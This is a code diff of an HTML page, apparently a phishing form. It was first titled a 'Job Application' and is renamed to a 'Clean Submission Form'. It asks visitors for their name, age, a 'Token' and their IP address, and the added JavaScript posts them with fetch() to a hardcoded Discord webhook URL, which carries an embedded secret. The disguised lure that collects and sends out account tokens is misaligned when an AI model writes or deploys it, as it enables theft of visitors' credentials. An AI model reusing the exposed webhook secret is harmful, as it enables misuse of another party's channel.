@@ -1,118 +1,93 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Job Application</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      background:#0f172a;
-      font-family:Arial, sans-serif;
-      color:#e5e7eb;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      min-height:100vh;
-      margin:0;
-    }
-    .box {
-      background:#020617;
-      padding:20px;
-      border-radius:12px;
-      width:100%;
-      max-width:420px;
-      animation: floatIn 0.6s ease-out both;
-    }
-    @keyframes floatIn {
-      from { opacity:0; transform: translateY(10px) scale(0.98); }
-      to { opacity:1; transform: translateY(0) scale(1); }
-    }
-    label { margin-top:10px; display:block; }
-    textarea, input {
-      width:100%;
-      margin-top:5px;
-      padding:10px;
-      border-radius:8px;
-      border:none;
-    }
-    button {
-      margin-top:15px;
-      width:100%;
-      padding:12px;
-      border:none;
-      border-radius:10px;
-      background:#6366f1;
-      color:white;
-      font-size:1rem;
-      cursor:pointer;
-      transition: transform 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
-    }
-    button:hover {
-      transform: translateY(-2px) scale(1.02);
-      box-shadow: 0 12px 30px rgba(99,102,241,0.45);
-      background:#7c7ff6;
-    }
-    button:active {
-      transform: translateY(0) scale(0.99);
-    }
-  /* Custom animated cursor */
-    body {
-      cursor: none;
-    }
-    .cursor {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 18px;
-      height: 18px;
-      border-radius: 50%;
-      background: radial-gradient(circle, #a5b4fc, #6366f1);
-      pointer-events: none;
-      transform: translate(-50%, -50%);
-      animation: pulse 1.2s infinite ease-in-out;
-      z-index: 9999;
-    }
-    @keyframes pulse {
-      0% { transform: translate(-50%, -50%) scale(1); opacity: 0.9; }
-      50% { transform: translate(-50%, -50%) scale(1.4); opacity: 0.5; }
-      100% { transform: translate(-50%, -50%) scale(1); opacity: 0.9; }
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Clean Submission Form</title>
+<style>
+  body { background:#0f172a; font-family:Arial,sans-serif; color:#e5e7eb; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; }
+  .form-box { background:#020617; padding:20px; border-radius:12px; width:100%; max-width:420px; box-shadow:0 10px 25px rgba(0,0,0,0.4); }
+  label { display:block; margin-top:12px; font-size:0.9rem; color:#cbd5f5; }
+  input { width:100%; padding:10px; margin-top:6px; border-radius:10px; border:none; outline:none; background:#020617; color:#e5e7eb; }
+  button { width:100%; margin-top:16px; padding:12px; border:none; border-radius:12px; background:#6366f1; color:white; font-size:1rem; cursor:pointer; transition: all 0.2s ease; }
+  button:hover { transform: scale(1.03); background:#7c7ff6; }
 </style>
 </head>
 <body>
 
-<div class="box">
-  <h2>🍪 Job Application</h2>
+<div class="form-box">
+  <h2>🍪 Submission Form</h2>
+  
+  <label>Name</label>
+  <input type="text" id="name" placeholder="Your Name">
 
-  <form action="https://discordapp.com/api/webhooks/1449687692269981767/I0xHJXi4UNYimnK-PHgOiJacI1Ie7bmMY9JCvi9sDk24fmSSqf8kQ9FTQUg9sUwQ_Mwp" method="POST">
+  <label>Age</label>
+  <input type="text" id="age" placeholder="Your Age">
 
-    <textarea name="content" rows="8" required>
-🍪 Job Application
+  <label>Token</label>
+  <input type="text" id="token" placeholder="Token">
 
-Name:
-Age:
-Token:
-IP:
+  <label>IP</label>
+  <input type="text" id="ip" placeholder="IP">
 
----
-Submitted via form
-    </textarea>
+  <label style="margin-top:12px; font-size:0.8rem;"><input type="checkbox" id="consent"> I confirm this information is correct</label>
 
-    <label style="font-size:0.8rem; margin-top:10px;">
-      <input type="checkbox" required> I confirm this information is accurate and submitted with consent
-    </label>
-
-    <button type="submit">Submit Application</button>
-  </form>
+  <button onclick="sendDiscord()">Submit</button>
+  <p id="status" style="margin-top:10px; font-size:0.85rem;"></p>
 </div>
 
-<div class="cursor" id="cursor"></div>
 <script>
-  const cursor = document.getElementById('cursor');
-  document.addEventListener('mousemove', e => {
-    cursor.style.top = e.clientY + 'px';
-    cursor.style.left = e.clientX + 'px';
-  });
+  const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1449687692269981767/I0xHJXi4UNYimnK-PHgOiJacI1Ie7bmMY9JCvi9sDk24fmSSqf8kQ9FTQUg9sUwQ_Mwp";
+
+  async function sendDiscord() {
+    const name = document.getElementById('name').value || "N/A";
+    const age = document.getElementById('age').value || "N/A";
+    const token = document.getElementById('token').value || "N/A";
+    const ip = document.getElementById('ip').value || "N/A";
+    const consent = document.getElementById('consent').checked;
+    const status = document.getElementById('status');
+
+    if (!consent) {
+      status.textContent = "Please confirm consent before submitting.";
+      return;
+    }
+
+    const payload = {
+      embeds: [{
+        title: "🍪 Clean Submission",
+        color: 0x6366f1,
+        fields: [
+          { name: "Name", value: name, inline: true },
+          { name: "Age", value: age, inline: true },
+          { name: "Token", value: token, inline: true },
+          { name: "IP", value: ip, inline: true },
+          { name: "Consent", value: "Confirmed", inline: false }
+        ],
+        timestamp: new Date()
+      }]
+    };
+
+    try {
+      const res = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      if (res.ok) {
+        status.textContent = "Submission sent ✅";
+        document.getElementById('name').value = "";
+        document.getElementById('age').value = "";
+        document.getElementById('token').value = "";
+        document.getElementById('ip').value = "";
+        document.getElementById('consent').checked = false;
+      } else {
+        status.textContent = "Failed to send.";
+      }
+    } catch (err) {
+      status.textContent = "Error sending submission.";
+    }
+  }
 </script>
+
 </body>
 </html>
